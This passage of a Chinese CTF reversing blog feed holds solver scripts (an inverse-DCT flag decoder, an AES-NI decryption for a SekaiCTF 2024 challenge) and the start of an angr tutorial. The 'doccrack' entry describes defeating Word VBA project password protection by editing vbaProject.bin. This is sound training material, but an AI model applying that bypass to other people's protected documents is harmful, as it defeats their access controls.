class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; N; ++n) &#123;</span><br><span class="line"><span class="type">double</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; N; ++k) &#123;</span><br><span class="line"><span class="keyword">if</span> (k == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">sum += Y[k] * std::<span class="built_in">cos</span>(<span class="number">3.14159265</span> * k * (n + <span class="number">0.5</span>) / N) * std::<span class="built_in">sqrt</span>(<span class="number">1.0</span> / N);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sum += Y[k] * std::<span class="built_in">cos</span>(<span class="number">3.14159265</span> * k * (n + <span class="number">0.5</span>) / N) * std::<span class="built_in">sqrt</span>(<span class="number">2.0</span> / N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">X[n] = sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">std::vector&lt;<span class="type">double</span>&gt; res = &#123; <span class="number">513.355</span>, <span class="number">-37.7986</span>, <span class="number">8.7316</span>, <span class="number">-10.7832</span>, <span class="number">-1.3097</span>, <span class="number">-20.5779</span>,</span><br><span class="line"><span class="number">6.98641</span>, <span class="number">-29.2989</span>, <span class="number">15.9422</span>,<span class="number">21.4138</span>,<span class="number">29.4754</span>, <span class="number">-2.77161</span>,</span><br><span class="line"><span class="number">-6.58794</span>, <span class="number">-4.22332</span>, <span class="number">-7.20771</span>, <span class="number">8.83506</span>, <span class="number">-4.38138</span>, <span class="number">-19.3898</span>,</span><br><span class="line"><span class="number">18.3453</span>, <span class="number">6.88259</span>, <span class="number">-14.7652</span>, <span class="number">14.6102</span>, <span class="number">24.7414</span>, <span class="number">-11.6222</span>,</span><br><span class="line"><span class="number">-9.754759999999999</span>,<span class="number">12.2424</span>,<span class="number">13.4343</span>, <span class="number">-34.9307</span>, <span class="number">-35.735</span>,</span><br><span class="line"><span class="number">-20.0848</span>, <span class="number">39.689</span>, <span class="number">21.879</span>, <span class="number">26.8296</span> &#125;;</span><br><span class="line">std::vector&lt;<span class="type">double</span>&gt; X;</span><br><span class="line"><span class="built_in">dct3</span>(res, X);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">double</span> x : X) &#123;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> chr = (<span class="type">char</span>)std::<span class="built_in">round</span>(X[i]);</span><br><span class="line">std::cout &lt;&lt; chr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//最后rot13</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="doccrack">doccrack</h3><p>用7z解压</p><p>vbaProject.bin中把DPB改成DPx，然后打开word的宏可以直接得到源代码。</p><p>把下面执行的地方删除，运行得到exe，然后直接逆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">data = [<span class="number">0x10C0</span>, <span class="number">0x1180</span>, <span class="number">0x1500</span>, <span class="number">0x1100</span>, <span class="number">0x14C0</span>, <span class="number">0x1040</span>, <span class="number">0x1F00</span>, <span class="number">0x1440</span>, <span class="number">0x1940</span>, <span class="number">0x1980</span>, <span class="number">0x1600</span>, <span class="number">0x0D80</span>, <span class="number">0x1D00</span>, <span class="number">0x1600</span>, <span class="number">0x18C0</span>, <span class="number">0x1980</span>, <span class="number">0x1A40</span>, <span class="number">0x1800</span>, <span class="number">0x1880</span>, <span class="number">0x1D40</span>, <span class="number">0x1A00</span>, <span class="number">0x1C80</span>, <span class="number">0x1D00</span>, <span class="number">0x0980</span>, <span class="number">0x0980</span>, <span class="number">0x0980</span>, <span class="number">0x1600</span>, <span class="number">0x1140</span>, <span class="number">0x0D80</span>, <span class="number">0x1C00</span>, <span class="number">0x1980</span>, <span class="number">0x1D40</span>, <span class="number">0x1880</span>, <span class="number">0x1600</span>, <span class="number">0x0DC0</span>, <span class="number">0x1840</span>, <span class="number">0x1600</span>, <span class="number">0x1280</span>, <span class="number">0x1980</span>, <span class="number">0x1900</span>, <span class="number">0x1D40</span>, <span class="number">0x0DC0</span>, <span class="number">0x1600</span>, <span class="number">0x1440</span>, <span class="number">0x0D80</span>, <span class="number">0x1D40</span>, <span class="number">0x1C80</span>, <span class="number">0x0C80</span>, <span class="number">0x1880</span>, <span class="number">0x1D00</span>, <span class="number">0x0980</span>, <span class="number">0x0980</span>, <span class="number">0x0980</span>, <span class="number">0x1E80</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    data[i]&gt;&gt;=<span class="number">6</span></span><br><span class="line">pxor(data,<span class="number">7</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sekaictf2024复现</title>
      <link href="/posts/925c7fa6.html"/>
      <url>/posts/925c7fa6.html</url>
      
        <content type="html"><![CDATA[<p>只做了一个，之后再复现其它的</p><h2 id="x64extenshion">x64extenshion</h2><p>用指令集自写了一个aes</p><p>先动态调试出加密的轮密钥，然后算出解密密钥直接出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wmmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_encrypt_array</span><span class="params">(__m128i* data, <span class="type">int</span> num_elements, __m128i* rkeys)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key1[] = &#123; <span class="number">0xFF</span>, <span class="number">0xFE</span>, <span class="number">0xFD</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xFA</span>, <span class="number">0xF9</span>, <span class="number">0xF8</span>, <span class="number">0xF7</span>, <span class="number">0xF6</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xF0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key2[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span> &#125;;</span><br><span class="line"></span><br><span class="line">__m128i key1_m128i = _mm_loadu_si128((__m128i*)key1);</span><br><span class="line">__m128i key2_m128i = _mm_loadu_si128((__m128i*)key2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> index = <span class="number">0</span>; index &lt; num_elements; ++index) &#123;</span><br><span class="line">__m128i state = _mm_loadu_si128(&amp;data[index]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">state = _mm_xor_si128(state, _mm_xor_si128(key1_m128i, key2_m128i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">__m128i previous_encrypted = _mm_loadu_si128(&amp;data[index - <span class="number">1</span>]);</span><br><span class="line">state = _mm_xor_si128(state, _mm_xor_si128(previous_encrypted, key2_m128i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; ++i) &#123;</span><br><span class="line">state = _mm_aesenc_si128(state, rkeys[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">state = _mm_aesenclast_si128(state, rkeys[<span class="number">13</span>]);</span><br><span class="line"></span><br><span class="line">_mm_storeu_si128(&amp;data[index], state);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_decrypt_array</span><span class="params">(__m128i* data, <span class="type">int</span> num_elements, __m128i* rkeys)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key1[] = &#123; <span class="number">0xFF</span>, <span class="number">0xFE</span>, <span class="number">0xFD</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xFA</span>, <span class="number">0xF9</span>, <span class="number">0xF8</span>, <span class="number">0xF7</span>, <span class="number">0xF6</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xF0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key2[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span> &#125;;</span><br><span class="line"></span><br><span class="line">__m128i key1_m128i = _mm_loadu_si128((__m128i*)key1);</span><br><span class="line">__m128i key2_m128i = _mm_loadu_si128((__m128i*)key2);</span><br><span class="line">__m128i initial_key = _mm_xor_si128(key1_m128i, key2_m128i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> index = num_elements - <span class="number">1</span>; index &gt;= <span class="number">0</span>; --index) &#123;</span><br><span class="line">__m128i state = _mm_loadu_si128(&amp;data[index]);</span><br><span class="line">state = _mm_xor_si128(state, rkeys[<span class="number">13</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">12</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">state = _mm_aesdec_si128(state, rkeys[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">state = _mm_aesdeclast_si128(state, initial_key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">__m128i previous_encrypted = _mm_loadu_si128(&amp;data[index - <span class="number">1</span>]);</span><br><span class="line">__m128i temp_key = _mm_xor_si128(previous_encrypted, key2_m128i);</span><br><span class="line">state = _mm_aesdeclast_si128(state, temp_key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_mm_storeu_si128(&amp;data[index], state);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">generateDecryptionKeys</span><span class="params">(<span class="type">const</span> __m128i* encryptionKeys, __m128i* decryptionKeys, <span class="type">int</span> nr)</span> &#123;</span><br><span class="line">decryptionKeys[nr - <span class="number">1</span>] = encryptionKeys[nr - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nr - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">decryptionKeys[i] = _mm_aesimc_si128(encryptionKeys[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ciphers[] = &#123; <span class="number">0x15</span>,<span class="number">0x2a</span>,<span class="number">0x38</span>,<span class="number">0x82</span>,<span class="number">0xcd</span>,<span class="number">0x8a</span>,<span class="number">0x36</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x4d</span>,<span class="number">0x22</span>,<span class="number">0x66</span>,<span class="number">0x5c</span>,<span class="number">0xe5</span>,<span class="number">0x8a</span>,<span class="number">0xea</span>,<span class="number">0x1c</span>,<span class="number">0xb2</span>,<span class="number">0x5d</span>,<span class="number">0xb2</span>,<span class="number">0x59</span>,<span class="number">0x64</span>,<span class="number">0x7a</span>,<span class="number">0x7e</span>,<span class="number">0x6d</span>,<span class="number">0x70</span>,<span class="number">0x21</span>,<span class="number">0x2a</span>,<span class="number">0xdd</span>,<span class="number">0x24</span>,<span class="number">0x6b</span>,<span class="number">0x8e</span>,<span class="number">0x38</span>,<span class="number">0x11</span>,<span class="number">0x45</span>,<span class="number">0xa3</span>,<span class="number">0x60</span>,<span class="number">0x3d</span>,<span class="number">0xca</span>,<span class="number">0x8f</span>,<span class="number">0x12</span>,<span class="number">0xb6</span>,<span class="number">0xec</span>,<span class="number">0x9c</span>,<span class="number">0x0f</span>,<span class="number">0x60</span>,<span class="number">0xd9</span>,<span class="number">0x26</span>,<span class="number">0xe9</span>,<span class="number">0x2c</span>,<span class="number">0x83</span>,<span class="number">0x9f</span>,<span class="number">0x61</span>,<span class="number">0x70</span>,<span class="number">0x0f</span>,<span class="number">0xdc</span>,<span class="number">0x78</span>,<span class="number">0x92</span>,<span class="number">0x59</span>,<span class="number">0x39</span>,<span class="number">0x48</span>,<span class="number">0xc1</span>,<span class="number">0xe7</span>,<span class="number">0xc2</span>,<span class="number">0x6b</span>,<span class="number">0x5c</span>,<span class="number">0xba</span>,<span class="number">0x1c</span>,<span class="number">0x43</span>,<span class="number">0xc2</span>,<span class="number">0x86</span>,<span class="number">0x80</span>,<span class="number">0x18</span>,<span class="number">0x62</span>,<span class="number">0x15</span>,<span class="number">0xd2</span>,<span class="number">0x1e</span>,<span class="number">0x0b</span>,<span class="number">0x6b</span>,<span class="number">0x9e</span>,<span class="number">0x17</span>,<span class="number">0x2c</span>,<span class="number">0x14</span>,<span class="number">0xc7</span>,<span class="number">0x41</span>,<span class="number">0x10</span>,<span class="number">0xc4</span>,<span class="number">0x35</span>,<span class="number">0xfe</span>,<span class="number">0x78</span>,<span class="number">0x6f</span>,<span class="number">0xb4</span>,<span class="number">0xfc</span>,<span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0xaa</span>,<span class="number">0xba</span>,<span class="number">0xdd</span>,<span class="number">0xaa</span>,<span class="number">0x15</span>,<span class="number">0x02</span>,<span class="number">0xb7</span>,<span class="number">0xf7</span>,<span class="number">0x77</span>,<span class="number">0x65</span>,<span class="number">0x43</span>,<span class="number">0xf3</span>,<span class="number">0x78</span>,<span class="number">0xcc</span>,<span class="number">0xee</span>,<span class="number">0x14</span>,<span class="number">0xca</span>,<span class="number">0x53</span>,<span class="number">0x42</span>,<span class="number">0xdf</span>,<span class="number">0x3a</span>,<span class="number">0xec</span>,<span class="number">0xed</span>,<span class="number">0xa6</span>,<span class="number">0x31</span>,<span class="number">0x4a</span>,<span class="number">0x81</span>,<span class="number">0x4d</span>,<span class="number">0xff</span>,<span class="number">0xbe</span>,<span class="number">0x4e</span>,<span class="number">0xc6</span>,<span class="number">0xef</span>,<span class="number">0x17</span>,<span class="number">0x68</span>,<span class="number">0xd0</span>,<span class="number">0x9d</span>,<span class="number">0xb1</span>,<span class="number">0x73</span>,<span class="number">0xff</span>,<span class="number">0x4e</span>,<span class="number">0x24</span>,<span class="number">0xbf</span>,<span class="number">0xec</span>,<span class="number">0xbb</span>,<span class="number">0x55</span>,<span class="number">0xf5</span>,<span class="number">0xaf</span>,<span class="number">0x7d</span>,<span class="number">0x7d</span>,<span class="number">0x6b</span>,<span class="number">0xdf</span>,<span class="number">0x9f</span>,<span class="number">0x9a</span>,<span class="number">0x3b</span>,<span class="number">0x23</span>,<span class="number">0x98</span>,<span class="number">0xb3</span>,<span class="number">0xa4</span>,<span class="number">0xb4</span>,<span class="number">0x1c</span>,<span class="number">0x26</span>,<span class="number">0x5f</span>,<span class="number">0x7a</span>,<span class="number">0x0d</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> rkeys[] = &#123; <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>,</span><br><span class="line"><span class="number">0xB7</span>, <span class="number">0x73</span>, <span class="number">0xC2</span>, <span class="number">0x9F</span>, <span class="number">0xB3</span>, <span class="number">0x76</span>, <span class="number">0xC4</span>, <span class="number">0x98</span>, <span class="number">0xBB</span>, <span class="number">0x7F</span>, <span class="number">0xCE</span>, <span class="number">0x93</span>, <span class="number">0xB7</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0x9C</span>,</span><br><span class="line"><span class="number">0xB9</span>, <span class="number">0x51</span>, <span class="number">0xA8</span>, <span class="number">0xCD</span>, <span class="number">0xAD</span>, <span class="number">0x44</span>, <span class="number">0xBE</span>, <span class="number">0xDA</span>, <span class="number">0xB5</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0xC1</span>, <span class="number">0xA9</span>, <span class="number">0x40</span>, <span class="number">0xBA</span>, <span class="number">0xDE</span>,</span><br><span class="line"><span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xDF</span>, <span class="number">0x4C</span>, <span class="number">0x3E</span>, <span class="number">0xF1</span>, <span class="number">0x1B</span>, <span class="number">0xD4</span>, <span class="number">0x85</span>, <span class="number">0x8E</span>, <span class="number">0xD5</span>, <span class="number">0x47</span>, <span class="number">0x32</span>, <span class="number">0xFC</span>, <span class="number">0x15</span>, <span class="number">0xDB</span>,</span><br><span class="line"><span class="number">0x9A</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0x74</span>, <span class="number">0x37</span>, <span class="number">0xA5</span>, <span class="number">0x4F</span>, <span class="number">0xAE</span>, <span class="number">0x82</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x6F</span>, <span class="number">0x2B</span>, <span class="number">0xB8</span>, <span class="number">0x51</span>, <span class="number">0xB1</span>,</span><br><span class="line"><span class="number">0xD6</span>, <span class="number">0x56</span>, <span class="number">0x17</span>, <span class="number">0xBD</span>, <span class="number">0xE8</span>, <span class="number">0xA7</span>, <span class="number">0x0C</span>, <span class="number">0x69</span>, <span class="number">0x6D</span>, <span class="number">0x29</span>, <span class="number">0xD9</span>, <span class="number">0x2E</span>, <span class="number">0x5F</span>, <span class="number">0xD5</span>, <span class="number">0xCC</span>, <span class="number">0xF5</span>,</span><br><span class="line"><span class="number">0x55</span>, <span class="number">0xE2</span>, <span class="number">0xBA</span>, <span class="number">0x92</span>, <span class="number">0x62</span>, <span class="number">0x47</span>, <span class="number">0xF5</span>, <span class="number">0x3C</span>, <span class="number">0xE0</span>, <span class="number">0xBF</span>, <span class="number">0x1E</span>, <span class="number">0x53</span>, <span class="number">0xCB</span>, <span class="number">0x07</span>, <span class="number">0x4F</span>, <span class="number">0xE2</span>,</span><br><span class="line"><span class="number">0xA9</span>, <span class="number">0xD2</span>, <span class="number">0x8F</span>, <span class="number">0xA2</span>, <span class="number">0x41</span>, <span class="number">0x75</span>, <span class="number">0x83</span>, <span class="number">0xCB</span>, <span class="number">0x2C</span>, <span class="number">0x5C</span>, <span class="number">0x5A</span>, <span class="number">0xE5</span>, <span class="number">0x73</span>, <span class="number">0x89</span>, <span class="number">0x96</span>, <span class="number">0x10</span>,</span><br><span class="line"><span class="number">0xDA</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x58</span>, <span class="number">0xB8</span>, <span class="number">0x02</span>, <span class="number">0xDF</span>, <span class="number">0x64</span>, <span class="number">0x58</span>, <span class="number">0xBD</span>, <span class="number">0xC1</span>, <span class="number">0x37</span>, <span class="number">0x93</span>, <span class="number">0xBA</span>, <span class="number">0x8E</span>, <span class="number">0xD5</span>,</span><br><span class="line"><span class="number">0x87</span>, <span class="number">0xCB</span>, <span class="number">0x8C</span>, <span class="number">0x7E</span>, <span class="number">0xC6</span>, <span class="number">0xBE</span>, <span class="number">0x0F</span>, <span class="number">0xB5</span>, <span class="number">0xEA</span>, <span class="number">0xE2</span>, <span class="number">0x55</span>, <span class="number">0x50</span>, <span class="number">0x99</span>, <span class="number">0x6B</span>, <span class="number">0xC3</span>, <span class="number">0x40</span>,</span><br><span class="line"><span class="number">0x34</span>, <span class="number">0x3A</span>, <span class="number">0x04</span>, <span class="number">0x51</span>, <span class="number">0x8C</span>, <span class="number">0x38</span>, <span class="number">0xDB</span>, <span class="number">0x35</span>, <span class="number">0xD4</span>, <span class="number">0x85</span>, <span class="number">0x1A</span>, <span class="number">0x02</span>, <span class="number">0x47</span>, <span class="number">0x3F</span>, <span class="number">0x94</span>, <span class="number">0xD7</span>,</span><br><span class="line"><span class="number">0xA7</span>, <span class="number">0xE9</span>, <span class="number">0x82</span>, <span class="number">0xDE</span>, <span class="number">0x61</span>, <span class="number">0x57</span>, <span class="number">0x8D</span>, <span class="number">0x6B</span>, <span class="number">0x8B</span>, <span class="number">0xB5</span>, <span class="number">0xD8</span>, <span class="number">0x3B</span>, <span class="number">0x12</span>, <span class="number">0xDE</span>, <span class="number">0x1B</span>, <span class="number">0x7B</span>,</span><br><span class="line"><span class="number">0xFD</span>, <span class="number">0x27</span>, <span class="number">0xAB</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x1F</span>, <span class="number">0x70</span>, <span class="number">0x45</span>, <span class="number">0xA5</span>, <span class="number">0x9A</span>, <span class="number">0x6A</span>, <span class="number">0x47</span>, <span class="number">0xE2</span>, <span class="number">0xA5</span>, <span class="number">0xFE</span>, <span class="number">0x90</span>,</span><br><span class="line"><span class="number">0xC7</span>, <span class="number">0x52</span>, <span class="number">0xE2</span>, <span class="number">0x46</span>, <span class="number">0xA6</span>, <span class="number">0x05</span>, <span class="number">0x6F</span>, <span class="number">0x2D</span>, <span class="number">0x2D</span>, <span class="number">0xB0</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0x3F</span>, <span class="number">0x6E</span>, <span class="number">0xAC</span>, <span class="number">0x6D</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> decryption_keys[<span class="number">224</span>];</span><br><span class="line">generateDecryptionKeys((__m128i*)rkeys, (__m128i*)decryption_keys, <span class="number">14</span>);</span><br><span class="line">aes_decrypt_array((__m128i*)ciphers, <span class="number">10</span>, (__m128i*)decryption_keys);</span><br><span class="line">ciphers[<span class="number">159</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, ciphers);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angr学习</title>
      <link href="/posts/3d36c04.html"/>
      <url>/posts/3d36c04.html</url>
      
        <content type="html"><![CDATA[<p>昨天打dasctf，被第一个题暴打了，之后复现的时候感觉可以爆破，尝试一下angr，（虽然不知道行不行）</p><h3 id="安装">安装</h3><p>因为是exe所以在win上安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade pip</span><br><span class="line">pip install GitPython</span><br><span class="line">pip install pyvex</span><br><span class="line">pip install unicorn</span><br><span class="line">pip install simuvex</span><br><span class="line">pip install angr  </span><br><span class="line">pip install &quot;numpy&lt;1.24.0&quot;</span><br></pre></td></tr></table></figure><p>最后的numpy一定要小于这个版本，不然会报错</p><h2 id="使用">使用</h2><p>载入文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = Project(<span class="string">&#x27;xxx&#x27;</span>,auto_load_libs = <span class="literal">False</span>)</span><br><span class="line"><span class="comment"># xxx为文件路径</span></span><br></pre></td></tr></table></figure><p>执行后，视为载入了这个文件，这时才可以分析</p><h3 id="数据类型及操作">数据类型及操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bv = state.solver.BVV(<span class="number">0x1234</span>, <span class="number">32</span>)       <span class="comment"># create a 32-bit-wide bitvector with value 0x1234</span></span><br><span class="line">state.solver.<span class="built_in">eval</span>(bv)                <span class="comment"># convert to python int</span></span><br></pre></td></tr></table></figure><p>位向量和int的转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">state.mem[index] <span class="comment">#指定一个内存地址</span></span><br><span class="line">state.mem[<span class="number">0x1000</span>].long = <span class="number">4</span> <span class="comment">#赋值为long类型的4 可以char, short, int, long, size_t, uint8_t, uint16_t等</span></span><br><span class="line"></span><br><span class="line">state.mem[<span class="number">0x1000</span>].long.resolved <span class="comment">#输出为位向量</span></span><br><span class="line">state.mem[<span class="number">0x1000</span>].long.concrete <span class="comment">#输出为int</span></span><br><span class="line"></span><br><span class="line">state.regs.rsi = state.solver.BVV(<span class="number">3</span>,<span class="number">64</span>) <span class="comment">#给一个寄存器赋值64位值为3，angr中寄存器的值均为位向量类型</span></span><br></pre></td></tr></table></figure><p>操作寄存器和内存地址</p><h3 id="求解器">求解器</h3><p>Simulation Managers用来管理状态，执行模拟和运行。控制一组state的符号执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simgr = proj.factory.simulation_manager(state) <span class="comment">#创建一个SM</span></span><br><span class="line">simgr.active <span class="comment">#查看SM状态</span></span><br></pre></td></tr></table></figure><p>不加state默认用入口点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">step() <span class="comment"># 执行一个基本块</span></span><br><span class="line">run() <span 